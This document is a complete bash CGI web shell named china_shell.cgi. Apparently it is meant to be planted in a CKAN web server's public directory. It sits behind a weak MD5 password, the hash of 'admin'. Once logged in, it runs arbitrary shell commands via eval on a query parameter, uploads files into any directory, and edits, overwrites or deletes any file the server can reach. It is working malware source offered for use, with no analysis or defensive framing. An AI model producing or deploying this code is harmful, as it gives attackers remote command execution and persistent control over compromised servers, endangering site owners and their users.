#!/usr/bin/bash

PASSWORD_HASH="21232f297a57a5a743894a0e4a801fc3"
SESSION_TIMEOUT=3600
DEFAULT_PATH="/usr/lib/ckan/ckan/src/ckan/ckan/public"

urldecode() {
    echo -e "$(echo "$1" | sed 's/+/ /g;s/%\(..\)/\\x\1/g')"
}

gen_session() {
    echo "$(date +%s)-$RANDOM-$RANDOM" | md5sum | cut -d' ' -f1
}

check_auth() {
    if echo "$HTTP_COOKIE" | grep -q "session="; then
        SESSION_ID=$(echo "$HTTP_COOKIE" | sed 's/.*session=\([^;]*\).*/\1/')
        if [ -f "/tmp/session_$SESSION_ID" ]; then
            SESSION_TIME=$(cat "/tmp/session_$SESSION_ID")
            CURRENT_TIME=$(date +%s)
            if [ $((CURRENT_TIME - SESSION_TIME)) -lt $SESSION_TIMEOUT ]; then
                return 0
            fi
        fi
    fi
    return 1
}

QUERY_STRING="${QUERY_STRING:-}"
ACTION=$(echo "$QUERY_STRING" | grep -oP 'action=\K[^&]*' | head -1)
RAW_PATH=$(echo "$QUERY_STRING" | grep -oP 'path=\K[^&]*' | head -1)
CMD=$(echo "$QUERY_STRING" | grep -oP 'cmd=\K[^&]*' | head -1 | sed 's/%20/ /g')

if [ -n "$RAW_PATH" ]; then
    CURRENT_DIR=$(urldecode "$RAW_PATH")
else
    CURRENT_DIR="$DEFAULT_PATH"
fi

if [ -z "$CURRENT_DIR" ] || [ ! -d "$CURRENT_DIR" ]; then
    CURRENT_DIR="$DEFAULT_PATH"
fi

if [ "$ACTION" = "login" ]; then
    read POST_DATA
    PASSWORD=$(echo "$POST_DATA" | grep -oP 'password=\K[^&]*' | sed 's/%20/ /g')
    PASSWORD_MD5=$(echo -n "$PASSWORD" | md5sum | cut -d' ' -f1)
    if [ "$PASSWORD_MD5" = "$PASSWORD_HASH" ]; then
        SESSION_ID=$(gen_session)
        echo "$(date +%s)" > "/tmp/session_$SESSION_ID"
        echo "Content-Type: text/html"
        echo "Set-Cookie: session=$SESSION_ID; path=/"
        echo ""
        echo "<meta http-equiv='refresh' content='0; url=./china_shell.cgi'>"
    else
        echo "Content-Type: text/html"
        echo ""
        echo "<html><body bgcolor='#000000' text='#ff0000'><center>"
        echo "<h1>❌ 密码错误 / Wrong Password</h1>"
        echo "<a href='./china_shell.cgi?action=logout'>← 返回 / Back</a>"
        echo "</center></body></html>"
    fi
    exit 0
fi

if [ "$ACTION" = "logout" ]; then
    echo "Content-Type: text/html"
    echo "Set-Cookie: session=; expires=Thu, 01 Jan 1970 00:00:00 GMT"
    echo ""
    echo "<meta http-equiv='refresh' content='0; url=./china_shell.cgi'>"
    exit 0
fi

if [ "$ACTION" = "terminal" ] && [ -n "$CMD" ] && check_auth; then
    echo "Content-Type: text/plain"
    echo ""
    echo "╔════════════════════════════════════════╗"
    echo "║  命令执行 / Command Execution          ║"
    echo "╠════════════════════════════════════════╣"
    echo "║  \$ $CMD"
    echo "╠════════════════════════════════════════╣"
    eval "$CMD" 2>&1
    echo "╚════════════════════════════════════════╝"
    exit 0
fi

if [ "$ACTION" = "delete" ] && [ -n "$RAW_PATH" ] && check_auth; then
    TARGET_FILE=$(urldecode "$RAW_PATH")
    if [ -f "$TARGET_FILE" ]; then
        rm -f "$TARGET_FILE" 2>/dev/null
    elif [ -d "$TARGET_FILE" ]; then
        rmdir "$TARGET_FILE" 2>/dev/null
    fi
    echo "Content-Type: text/html"
    echo ""
    echo "<meta http-equiv='refresh' content='0; url=./china_shell.cgi?path=$(dirname "$TARGET_FILE")'>"
    exit 0
fi

if [ "$ACTION" = "save" ] && [ -n "$RAW_PATH" ] && check_auth; then
    TARGET_FILE=$(urldecode "$RAW_PATH")
    CONTENT=$(cat)
    echo "$CONTENT" > "$TARGET_FILE"
    echo "Content-Type: text/html"
    echo ""
    echo "<meta http-equiv='refresh' content='0; url=./china_shell.cgi?action=edit&path=$TARGET_FILE'>"
    exit 0
fi

if [ "$ACTION" = "edit" ] && [ -n "$RAW_PATH" ] && check_auth; then
    TARGET_FILE=$(urldecode "$RAW_PATH")
    if [ ! -f "$TARGET_FILE" ]; then
        echo "Content-Type: text/html"
        echo ""
        echo "<html><body bgcolor='#000000' text='#ff0000'><center><h1>❌ 文件不存在 / File not found</h1>"
        echo "<a href='./china_shell.cgi?path=$(dirname "$TARGET_FILE")'>← 返回 / Back</a></center></body></html>"
        exit 0
    fi
    echo "Content-Type: text/html"
    echo ""
    cat << EDITFORM
<html>
<head>
<meta charset="UTF-8">
<title>编辑文件 / Edit File</title>
<style>
body { background: #000000; color: #00ff00; font-family: 'Courier New', monospace; }
.container { width: 90%; margin: 20px auto; }
.header { background: #220000; border: 1px solid #ff0000; padding: 10px; text-align: center; }
textarea { width: 100%; height: 500px; background: #001100; color: #00ff00; border: 1px solid #ff0000; font-family: monospace; padding: 10px; box-sizing: border-box; }
button { background: #330000; color: #ff0000; border: 1px solid #ff0000; padding: 10px 20px; cursor: pointer; margin: 10px; font-family: monospace; font-size: 14px; }
button:hover { background: #ff0000; color: #000000; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h2>📝 编辑文件 / Edit File</h2>
<h3>📄 $TARGET_FILE</h3>
</div>
<form method="POST" action="./china_shell.cgi?action=save&path=$(echo "$TARGET_FILE" | sed 's/ /%20/g')">
<textarea name="content">$(cat "$TARGET_FILE" 2>/dev/null | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')</textarea><br>
<center>
<button type="submit">💾 保存 / Save</button>
<button type="button" onclick="window.location.href='./china_shell.cgi?path=$(dirname "$TARGET_FILE" | sed 's/ /%20/g')'">⬅ 返回 / Back</button>
</center>
</form>
</div>
</body>
</html>
EDITFORM
    exit 0
fi

if [ "$ACTION" = "upload" ] && check_auth; then
    if [ -n "$CONTENT_LENGTH" ] && [ "$CONTENT_LENGTH" -gt 0 ]; then
        BOUNDARY=$(echo "$CONTENT_TYPE" | grep -oP 'boundary=\K[^;]*')
        TEMP_FILE="/tmp/upload_$$.tmp"
        cat > "$TEMP_FILE"
        
        FILENAME=$(grep -oP 'filename="\K[^"]+' "$TEMP_FILE" | head -1)
        if [ -n "$FILENAME" ]; then
            sed -n '/Content-Type:/,$p' "$TEMP_FILE" | tail -n +2 | sed '$d' | head -n -1 > "$CURRENT_DIR/$FILENAME"
            UPLOAD_STATUS="success"
        else
            UPLOAD_STATUS="failed"
        fi
        rm -f "$TEMP_FILE"
        
        echo "Content-Type: text/html"
        echo ""
        if [ "$UPLOAD_STATUS" = "success" ]; then
            echo "<html><head><meta http-equiv='refresh' content='1; url=./china_shell.cgi?path=$(echo "$CURRENT_DIR" | sed 's/ /%20/g')'></head>"
            echo "<body bgcolor='#000000'><center><font color='#00ff00'>✅ 上传成功 / Upload Success: $FILENAME</font></center></body></html>"
        else
            echo "<html><head><meta http-equiv='refresh' content='2; url=./china_shell.cgi?path=$(echo "$CURRENT_DIR" | sed 's/ /%20/g')'></head>"
            echo "<body bgcolor='#000000'><center><font color='#ff0000'>❌ 上传失败 / Upload Failed</font></center></body></html>"
        fi
    else
        echo "Content-Type: text/html"
        echo ""
        echo "<html><body bgcolor='#000000'><center><font color='#ff0000'>❌ No file received</font></center></body></html>"
    fi
    exit 0
fi

if ! check_auth; then
    echo "Content-Type: text/html"
    echo ""
    cat << LOGINPAGE
<html>
<head>
<meta charset="UTF-8">
<title>登录 / Login</title>
<style>
body {
    background: #000000;
    margin: 0;
    padding: 0;
    font-family: 'Courier New', monospace;
}
.login-container {
    border: 2px solid #ff0000;
    width: 450px;
    margin: 150px auto;
    padding: 30px;
    text-align: center;
    background: #0a0a0a;
}
h1 {
    color: #ff0000;
    font-size: 26px;
    letter-spacing: 3px;
}
h2 {
    color: #ff6600;
    font-size: 14px;
    margin-top: 10px;
}
input {
    background: #001100;
    border: 1px solid #ff0000;
    color: #00ff00;
    padding: 12px 20px;
    width: 80%;
    margin: 15px 0;
    font-family: monospace;
    font-size: 14px;
    text-align: center;
}
button {
    background: #330000;
    border: 1px solid #ff0000;
    color: #ff0000;
    padding: 10px 30px;
    font-size: 16px;
    cursor: pointer;
    font-family: monospace;
}
button:hover {
    background: #ff0000;
    color: #000000;
}
.footer {
    margin-top: 25px;
    color: #ff000066;
    font-size: 11px;
}
hr {
    border-color: #ff0000;
    width: 70%;
}
</style>
</head>
<body>
<div class="login-container">
<h1>⚡ WEB SHELL ⚡</h1>
<h2>文件管理 / File Manager</h2>
<hr>
<form method="POST" action="./china_shell.cgi?action=login">
<input type="password" name="password" placeholder="密码 / Password" autofocus><br>
<button type="submit">登录 / Login</button>
</form>
<div class="footer">
<span>▶ 授权访问 / Authorized Access ◀</span>
</div>
</div>
</body>
</html>
LOGINPAGE
    exit 0
fi

echo "Content-Type: text/html"
echo ""

cat << MAINHTML
<html>
<head>
<meta charset="UTF-8">
<title>文件管理器 / File Manager</title>
<style>
body {
    background: #000000;
    color: #00ff00;
    font-family: 'Courier New', monospace;
    margin: 0;
    padding: 15px;
}
.header {
    background: #110000;
    border: 1px solid #ff0000;
    padding: 10px 15px;
    margin-bottom: 15px;
}
.header h1 {
    color: #ff0000;
    margin: 0;
    font-size: 18px;
    display: inline-block;
}
.header span {
    color: #ff6600;
    font-size: 12px;
    margin-left: 20px;
}
.stats {
    float: right;
    color: #00ff00;
    font-size: 11px;
}
.nav {
    background: #001100;
    border-left: 3px solid #ff0000;
    padding: 8px 12px;
    margin-bottom: 15px;
}
.nav a {
    color: #00ff00;
    text-decoration: none;
    margin-right: 20px;
    font-size: 13px;
}
.nav a:hover {
    color: #ff0000;
}
.current-dir {
    color: #ff6600;
    margin-top: 8px;
    font-size: 12px;
}
.terminal-box {
    background: #000000;
    border: 1px solid #ff0000;
    margin-bottom: 20px;
    padding: 10px;
}
.terminal-box h3 {
    color: #ff6600;
    margin: 0 0 10px 0;
    font-size: 13px;
}
.terminal-input {
    display: flex;
    gap: 10px;
}
.terminal-input input {
    flex: 1;
    background: #001100;
    border: 1px solid #ff0000;
    color: #00ff00;
    padding: 8px;
    font-family: monospace;
}
.terminal-input button {
    background: #330000;
    border: 1px solid #ff0000;
    color: #ff0000;
    padding: 8px 15px;
    cursor: pointer;
}
.terminal-output {
    background: #001100;
    border: 1px solid #ff000033;
    padding: 10px;
    margin-top: 10px;
    max-height: 250px;
    overflow: auto;
    font-size: 11px;
}
.upload-box {
    background: #001100;
    border: 1px solid #ff0000;
    padding: 12px;
    margin-bottom: 20px;
}
.upload-box form {
    display: flex;
    gap: 10px;
    align-items: center;
    flex-wrap: wrap;
}
.upload-box input[type="file"] {
    background: #001100;
    color: #00ff00;
    border: 1px solid #ff0000;
    padding: 5px;
}
.upload-box button {
    background: #330000;
    border: 1px solid #ff0000;
    color: #ff0000;
    padding: 6px 15px;
    cursor: pointer;
}
.file-table {
    background: #000000;
    border: 1px solid #ff0000;
    width: 100%;
    border-collapse: collapse;
}
.file-table th {
    background: #220000;
    color: #ff0000;
    padding: 8px;
    text-align: left;
    font-size: 12px;
    border-bottom: 1px solid #ff0000;
}
.file-table td {
    padding: 6px 8px;
    font-size: 12px;
    border-bottom: 1px solid #220000;
}
.file-table tr:hover {
    background: #110000;
}
.dir-link {
    color: #ffaa00;
    text-decoration: none;
}
.file-link {
    color: #00ff00;
    text-decoration: none;
}
.actions a {
    color: #ffaa00;
    text-decoration: none;
    margin-right: 12px;
    font-size: 11px;
}
.delete {
    color: #ff4444 !important;
}
.footer {
    margin-top: 20px;
    text-align: center;
    border-top: 1px solid #ff0000;
    padding-top: 10px;
    font-size: 10px;
    color: #ff000066;
}
</style>
<script>
function runCmd() {
    var cmd = document.getElementById('cmd_input').value;
    if (cmd) {
        var output = document.getElementById('cmd_output');
        output.innerHTML = '<font color="#ff6600">执行中 / Executing...</font>';
        fetch('./china_shell.cgi?action=terminal&cmd=' + encodeURIComponent(cmd))
            .then(res => res.text())
            .then(data => { output.innerHTML = '<pre style="margin:0">' + data + '</pre>'; })
            .catch(err => { output.innerHTML = '<font color="#ff0000">Error: ' + err + '</font>'; });
    }
}
</script>
</head>
<body>

<div class="header">
    <h1>⚡ 文件管理器 / File Manager ⚡</h1>
    <span>v2.0</span>
    <div class="stats">👤 用户 / User: root | 🖥️ $(hostname 2>/dev/null || echo "localhost")</div>
</div>

<div class="nav">
    <a href="./china_shell.cgi">🏠 首页 / Home</a>
    <a href="./china_shell.cgi?path=$(echo "$CURRENT_DIR" | sed 's/ /%20/g')">🔄 刷新 / Refresh</a>
    <a href="./china_shell.cgi?action=logout">🚪 退出 / Logout</a>
</div>
<div class="current-dir">
📂 当前目录 / Current Directory: <strong style="color:#00ff00">$CURRENT_DIR</strong>
</div>

<div class="terminal-box">
    <h3>🐚 命令执行 / Command Execution</h3>
    <div class="terminal-input">
        <input type="text" id="cmd_input" placeholder="输入命令 / Enter command..." onkeypress="if(event.keyCode==13) runCmd()">
        <button onclick="runCmd()">▶ 执行 / Execute</button>
    </div>
    <div id="cmd_output" class="terminal-output">
        <pre>┌────────────────────────────────────────────┐
│ 等待命令 / Waiting for command...        │
│ 输入命令后点击执行                        │
└────────────────────────────────────────────┘</pre>
    </div>
</div>

<div class="upload-box">
    <form method="POST" enctype="multipart/form-data" action="./china_shell.cgi?action=upload&amp;path=$(echo "$CURRENT_DIR" | sed 's/ /%20/g')">
        📤 上传文件 / Upload File:
        <input type="file" name="file">
        <button type="submit">⬆ 上传 / Upload</button>
    </form>
</div>

<table class="file-table">
    <thead>
        <tr>
            <th>📁 文件名 / Name</th>
            <th>📦 大小 / Size</th>
            <th>🔐 权限 / Perm</th>
            <th>⚙️ 操作 / Actions</th>
        </tr>
    </thead>
    <tbody>
MAINHTML

cd "$CURRENT_DIR" 2>/dev/null

if [ "$CURRENT_DIR" != "/" ] && [ "$CURRENT_DIR" != "$DEFAULT_PATH" ]; then
    PARENT_DIR=$(dirname "$CURRENT_DIR")
    echo "<tr><td><a href='./china_shell.cgi?path=$(echo "$PARENT_DIR" | sed 's/ /%20/g')' class='dir-link'>📁 ../</a></td><td>&lt;DIR&gt;</td><td>-</td><td>-</td></tr>"
fi

for item in *; do
    if [ -e "$item" ]; then
        if [ -d "$item" ]; then
            echo "<tr><td><a href='./china_shell.cgi?path=$(echo "$CURRENT_DIR/$item" | sed 's/ /%20/g')' class='dir-link'>📁 $item/</a></td><td>&lt;DIR&gt;</td><td>$(stat -c %a "$item" 2>/dev/null)</td><td>-</td></tr>"
        else
            size=$(stat -c %s "$item" 2>/dev/null)
            if [ "$size" -lt 1024 ]; then
                size_txt="${size} B"
            elif [ "$size" -lt 1048576 ]; then
                size_txt="$((size / 1024)) KB"
            else
                size_txt="$((size / 1048576)) MB"
            fi
            echo "<tr>"
            echo "<td><a href='#' class='file-link'>📄 $item</a></td>"
            echo "<td>$size_txt</td>"
            echo "<td>$(stat -c %a "$item" 2>/dev/null)</td>"
            echo "<td class='actions'>"
            echo "<a href='./china_shell.cgi?action=edit&path=$(echo "$CURRENT_DIR/$item" | sed 's/ /%20/g')'>✏️ 编辑 / Edit</a>"
            echo "<a href='./china_shell.cgi?action=delete&path=$(echo "$CURRENT_DIR/$item" | sed 's/ /%20/g')' class='delete' onclick='return confirm(\"删除 $item ?\\nDelete $item ?\")'>🗑️ 删除 / Delete</a>"
            echo "</td></tr>"
        fi
    fi
done

cat << MAINHTML
    </tbody>
</table>

<div class="footer">
    <span>文件管理器 / File Manager | 授权访问 / Authorized Access Only</span>
</div>

</body>
</html>
MAINHTML
